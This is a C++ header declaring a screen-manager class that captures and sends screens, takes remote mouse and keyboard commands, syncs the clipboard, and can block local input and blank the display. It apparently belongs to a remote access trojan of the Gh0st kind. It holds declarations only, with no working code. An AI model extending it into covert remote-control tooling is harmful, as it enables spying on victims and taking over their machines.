#pragma once

#include "Manager.h"
#include "ScreenSpy.h"

class CScreenManager : public CManager  
{
public:
	CScreenManager(CClientSocket *pClient);
	virtual ~CScreenManager();

	virtual void OnReceive(LPBYTE lpBuffer, UINT nSize);

	void sendBITMAPINFO();
	void sendFirstScreen();
	void sendNextScreen();
	bool IsMetricsChange();
	bool IsConnect();
	int	GetCurrentPixelBits();

private:
	void ResetScreen(int biBitCount);
	void ProcessMouseAndKeyCommand(LPBYTE lpBuffer, UINT nSize);
	void UpdateLocalClipboard(char *buf, int len);
	void SendLocalClipboard();

	static DWORD WINAPI WorkThread(LPVOID lparam);
	static DWORD WINAPI	ControlThread(LPVOID lparam);
	
public:
	bool m_bIsWorking;
	bool m_bIsBlockInput;
	bool m_bIsBlankScreen;

private:
	BYTE m_bAlgorithm;
	bool m_bIsCaptureLayer;
	int m_biBitCount;
	HANDLE m_hWorkThread, m_hBlankThread;
	
	CCursorInfo	m_CursorInfo;
	CScreenSpy *m_pScreenSpy;
};